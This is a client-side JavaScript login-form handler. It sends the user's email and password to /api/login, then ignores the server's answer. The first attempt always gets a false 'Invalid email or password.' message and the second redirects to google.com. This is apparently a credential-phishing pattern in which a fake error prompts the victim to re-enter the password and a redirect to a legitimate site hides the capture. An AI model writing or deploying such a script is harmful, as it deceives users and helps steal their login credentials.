(() => {
  const form = document.getElementById("login-form");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const errorEl = document.getElementById("error");
  const submitBtn = document.getElementById("login-btn");

  let attemptCount = 0;

  function setError(message) {
    if (!message) {
      errorEl.hidden = true;
      errorEl.textContent = "";
      return;
    }
    errorEl.hidden = false;
    errorEl.textContent = message;
  }

  function setLoading(loading) {
    submitBtn.disabled = loading;
    submitBtn.classList.toggle("is-loading", loading);
  }

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    setError("");

    const email = emailInput.value.trim();
    const password = passwordInput.value;

    if (!email || !password) {
      setError("Please enter your email and password.");
      return;
    }

    setLoading(true);

    try {
      // Still call the real login endpoint every time
      await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        credentials: "same-origin",
        body: JSON.stringify({ email, password }),
      });

      attemptCount += 1;

      if (attemptCount === 1) {
        setError("Invalid email or password.");
        setLoading(false);
        return;
      }

      window.location.assign("https://www.google.com");
    } catch {
      setError("Unable to reach the server. Please try again.");
      setLoading(false);
    }
  });
})();
